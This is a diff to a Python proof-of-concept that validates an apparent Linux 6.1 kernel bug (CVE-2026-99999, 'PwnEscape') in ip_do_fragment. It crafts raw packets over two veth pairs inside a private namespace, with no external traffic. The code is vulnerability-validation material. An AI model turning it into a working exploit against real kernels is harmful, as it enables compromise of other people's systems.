@@ -3,7 +3,7 @@
 CVE-2026-99999 (PwnEscape) -- bounded functional validation.
 
 Runs entirely inside a fresh user+network namespace (invoke via: unshare -Urn).
-All traffic stays on a private veth pair created inside that namespace; two
+All traffic stays on two private veth pairs created inside that namespace; two
 90-byte frames are sent (one control, one active). No external traffic.
 
 Mechanism (Linux 6.1, pre-fix ip_do_fragment):
@@ -84,13 +84,14 @@ RTN_UNICAST = 1
 RTPROT_STATIC = 4
 RT_TABLE_MAIN = 254
 
-MAC_P = (0x02, 0x00, 0x00, 0x00, 0x00, 0x01)   # vethP (test side)
-MAC_Q = (0x02, 0x00, 0x00, 0x00, 0x00, 0x02)   # vethQ (egress, small MTU)
+MAC_IN_TX = (0x02, 0x00, 0x00, 0x00, 0x00, 0x01)
+MAC_IN_RX = (0x02, 0x00, 0x00, 0x00, 0x00, 0x02)
+MAC_OUT_TX = (0x02, 0x00, 0x00, 0x00, 0x00, 0x03)
+MAC_OUT_RX = (0x02, 0x00, 0x00, 0x00, 0x00, 0x04)
 MAC_NH = (0x02, 0x00, 0x00, 0x00, 0x00, 0x99)  # permanent neighbour for 10.9.0.1
 
-IP_P = bytes([10, 0, 0, 1])
-IP_Q = bytes([10, 0, 0, 2])
-IP_ROUTE_DST = bytes([10, 9, 0, 0])
+IP_IN_RX = bytes([10, 5, 0, 1])
+IP_OUT_TX = bytes([10, 9, 0, 2])
 IP_DST = bytes([10, 9, 0, 1])
 IP_SRC = bytes([10, 5, 5, 5])
 
@@ -275,7 +276,7 @@ def build_case(ident, csum_start, csum_off, payload):
                        42,                          # Ethernet + IPv4 + UDP
                        0,                           # no GSO; only partial checksum
                        csum_start, csum_off)
-    eth = bytes(MAC_Q) + bytes(MAC_P) + b"\x08\x00"
+    eth = bytes(MAC_IN_RX) + bytes(MAC_IN_TX) + b"\x08\x00"
     tx = vnet + eth + hdr64 + udp + payload
     return tx, datagram
 
@@ -308,11 +309,11 @@ def open_sockets():
     out("socket_stage", step="tx_bind")
     # Python's AF_PACKET address tuple takes the Ethernet protocol in host
     # byte order; socket() itself takes the network-order protocol value.
-    tx.bind(("vethP", ETH_P_ALL))
+    tx.bind(("vInTx", ETH_P_ALL))
     out("socket_stage", step="capture_create")
     cap = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
     out("socket_stage", step="capture_bind")
-    cap.bind(("vethP", ETH_P_ALL))
+    cap.bind(("vOutRx", ETH_P_ALL))
     cap.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 1 << 20)
     out("socket_stage", step="ready")
     return tx, cap
@@ -392,17 +393,23 @@ def main():
                            None: "unreadable"}[has_help])
 
     nl = Nl()
-    veth_create(nl, "vethP", "vethQ")
+    # A large-MTU pair receives the crafted frame. A separate pair provides
+    # the MTU-68 egress that drives ip_do_fragment. Reusing one pair would
+    # cause the 90-byte ingress frame to be dropped by the peer's small MTU.
+    veth_create(nl, "vInTx", "vInRx")
+    veth_create(nl, "vOutTx", "vOutRx")
     idx = link_index_map(nl)
-    if "vethP" not in idx or "vethQ" not in idx:
-        out("error", message="veth pair not found after creation")
+    names = ("vInTx", "vInRx", "vOutTx", "vOutRx")
+    if any(name not in idx for name in names):
+        out("error", message="veth interfaces not found after creation")
         return
-    link_set(nl, idx["vethP"], mac=MAC_P, up=True)
-    link_set(nl, idx["vethQ"], mac=MAC_Q, mtu=MTU_EGRESS, up=True)
-    addr_add(nl, idx["vethP"], IP_P, 8)
-    addr_add(nl, idx["vethQ"], IP_Q, 8)
-    route_add(nl, idx["vethQ"], IP_ROUTE_DST, 16)
-    neigh_add(nl, idx["vethQ"], IP_DST, MAC_NH)
+    link_set(nl, idx["vInTx"], mac=MAC_IN_TX, up=True)
+    link_set(nl, idx["vInRx"], mac=MAC_IN_RX, up=True)
+    link_set(nl, idx["vOutTx"], mac=MAC_OUT_TX, mtu=MTU_EGRESS, up=True)
+    link_set(nl, idx["vOutRx"], mac=MAC_OUT_RX, up=True)
+    addr_add(nl, idx["vInRx"], IP_IN_RX, 16)
+    addr_add(nl, idx["vOutTx"], IP_OUT_TX, 16)
+    neigh_add(nl, idx["vOutTx"], IP_DST, MAC_NH)
     sysctl_path = "/proc/sys/net/ipv4/ip_forward"
     try:
         with open(sysctl_path, "r") as fh:
@@ -419,8 +426,9 @@ def main():
             # GitHub mounts /proc/sys read-only in ubuntu-slim. Continue to
             # obtain an explicit no-forwarding result instead of aborting.
             out("sysctl_warning", op="write_ip_forward", error=repr(exc))
-    out("netns", vethP_ifindex=idx["vethP"], vethQ_ifindex=idx["vethQ"],
-        vethQ_mtu=MTU_EGRESS,
+    out("netns", vInTx=idx["vInTx"], vInRx=idx["vInRx"],
+        vOutTx=idx["vOutTx"], vOutRx=idx["vOutRx"],
+        vOutTx_mtu=MTU_EGRESS,
         ip_forward={True: "enabled", False: "disabled", None: "unknown"}[forwarding])
 
     if forwarding is not True:
